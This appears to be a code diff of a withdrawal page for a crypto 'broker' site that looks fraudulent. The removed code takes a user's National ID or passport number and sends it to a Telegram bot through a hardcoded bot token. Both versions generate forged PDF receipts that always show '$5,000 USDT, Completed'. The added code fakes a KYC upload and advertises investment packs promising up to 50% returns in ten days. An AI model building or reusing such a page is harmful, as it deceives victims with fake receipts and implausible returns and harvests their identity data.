@@ -4,90 +4,86 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Withdraw - Jblackx Broker</title>
-  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"/>
+  <link rel="stylesheet" href="style.css"/>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
   <style>
-    body {
-      background-color: #0b0c10;
-      color: #c5c6c7;
-      padding: 30px;
-      font-family: 'Segoe UI', sans-serif;
-    }
-    .btn-primary, .btn-success {
-      border-radius: 12px;
-    }
-    #kycModal .modal-content {
-      background: #1f2833;
-      color: #fff;
-    }
+    .btn { padding: 12px 20px; border: none; border-radius: 8px; cursor: pointer; }
+    .green-btn { background-color: #28a745; color: white; }
+    .modal { display: none; position: fixed; top: 0; left: 0; width:100%; height:100%; background: rgba(0,0,0,0.6); justify-content: center; align-items: center; }
+    .modal-content { background: white; padding: 20px; border-radius: 10px; width: 300px; text-align: center; }
+    .pack { border: 2px solid #ccc; padding: 20px; border-radius: 12px; margin: 15px 0; text-align: center; }
   </style>
 </head>
-<body>
+<body style="font-family: Arial, sans-serif; padding: 40px; background-color: #f4f4f4;">
 
-  <div class="container text-center">
-    <h2 class="mb-4">🔐 Withdrawal Panel</h2>
-
-    <button class="btn btn-primary" onclick="showKYC()">Proceed with Withdrawal</button>
-    
-    <div id="receiptArea" class="mt-4" style="display:none;">
-      <button class="btn btn-success" onclick="downloadReceipt()">📄 Download Receipt (PDF)</button>
-    </div>
-  </div>
+  <h1>💸 Withdraw Funds</h1>
 
   <!-- KYC Modal -->
-  <div class="modal fade" id="kycModal" tabindex="-1" role="dialog" aria-labelledby="kycModalLabel" aria-hidden="true">
-    <div class="modal-dialog modal-dialog-centered">
-      <div class="modal-content p-4">
-        <h5 class="modal-title" id="kycModalLabel">🔎 KYC Verification Required</h5>
-        <p>Please complete KYC verification to proceed with withdrawal.</p>
-        <input type="text" id="kycInput" class="form-control mb-3" placeholder="Enter National ID or Passport No."/>
-        <button class="btn btn-success btn-block" onclick="completeKYC()">Verify and Withdraw</button>
-      </div>
+  <div id="kycModal" class="modal">
+    <div class="modal-content">
+      <h2>KYC Verification Required</h2>
+      <p>Please upload a valid ID document to proceed.</p>
+      <input type="file" />
+      <br/><br/>
+      <button class="btn green-btn" onclick="closeKYC()">✅ Submit KYC</button>
     </div>
   </div>
 
-  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js"></script>
+  <!-- Withdraw Form -->
+  <form onsubmit="event.preventDefault(); openKYC();">
+    <label>Amount (USD):</label><br/>
+    <input type="number" placeholder="Enter amount" required style="padding:10px; width:100%; margin-top:10px;"><br/><br/>
+    <label>Wallet Address:</label><br/>
+    <input type="text" placeholder="Enter USDT wallet" required style="padding:10px; width:100%; margin-top:10px;"><br/><br/>
+    <button type="submit" class="btn green-btn">🚀 Request Withdrawal</button>
+  </form>
 
+  <br/><br/>
+
+  <!-- PDF Button -->
+  <button onclick="downloadReceipt()" class="btn green-btn">📄 Download Receipt (PDF)</button>
+
+  <br/><br/>
+
+  <!-- Pack Upgrade Options -->
+  <h2>📦 Upgrade Your Investment Pack</h2>
+  <div class="pack">
+    <h3>Starter Pack</h3>
+    <p>💰 Min: $100 - Max: $999</p>
+    <p>⏳ Duration: 5 days</p>
+    <p>📈 ROI: 10%</p>
+    <button class="btn green-btn">🛒 Choose Starter</button>
+  </div>
+  <div class="pack">
+    <h3>Pro Pack</h3>
+    <p>💰 Min: $1,000 - Max: $4,999</p>
+    <p>⏳ Duration: 7 days</p>
+    <p>📈 ROI: 25%</p>
+    <button class="btn green-btn">🛒 Choose Pro</button>
+  </div>
+  <div class="pack">
+    <h3>Elite Pack</h3>
+    <p>💰 Min: $5,000+</p>
+    <p>⏳ Duration: 10 days</p>
+    <p>📈 ROI: 50%</p>
+    <button class="btn green-btn">🛒 Choose Elite</button>
+  </div>
+
+  <!-- Scripts -->
   <script>
-    function showKYC() {
-      $('#kycModal').modal('show');
+    function openKYC() {
+      document.getElementById("kycModal").style.display = "flex";
     }
-
-    function completeKYC() {
-      const kyc = document.getElementById('kycInput').value.trim();
-      if (!kyc) {
-        alert("Enter a valid KYC ID to proceed.");
-        return;
-      }
-      $('#kycModal').modal('hide');
-      sendToTelegram(kyc);
-      document.getElementById('receiptArea').style.display = 'block';
-    }
-
-    function sendToTelegram(kycID) {
-      const txID = "BNX-" + Math.random().toString(36).substring(2, 10).toUpperCase();
-      const payload = {
-        chat_id: "@Officialwoongna",
-        text: `💸 *New Withdrawal Request*\n\n👤 User: @Officialwoongna\n🆔 KYC: ${kycID}\n💰 Amount: $5,000 USDT\n🔁 TXID: ${txID}\n✅ Status: Completed\n📅 ${new Date().toLocaleString()}`,
-        parse_mode: "Markdown"
-      };
-
-      fetch(`https://api.telegram.org/bot8313979154:AAFQ9nl0yINqmAp3dgpOrSwrNAeP9YN1k3g/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-      });
+    function closeKYC() {
+      document.getElementById("kycModal").style.display = "none";
+      alert("✅ KYC submitted! Withdrawal processing...");
     }
 
     function downloadReceipt() {
       const { jsPDF } = window.jspdf;
       const doc = new jsPDF();
       const txID = "BNX-" + Math.random().toString(36).substring(2, 10).toUpperCase();
-
-      doc.setFontSize(18);
+      doc.setFontSize(20);
       doc.text("Jblackx Broker - Withdrawal Receipt", 20, 20);
       doc.setFontSize(12);
       doc.text(`Transaction ID: ${txID}`, 20, 40);
@@ -95,7 +91,6 @@
       doc.text(`User: @Officialwoongna`, 20, 60);
       doc.text(`Amount: $5,000 USDT`, 20, 70);
       doc.text(`Status: Completed`, 20, 80);
-
       doc.save("withdrawal_receipt.pdf");
     }
   </script>
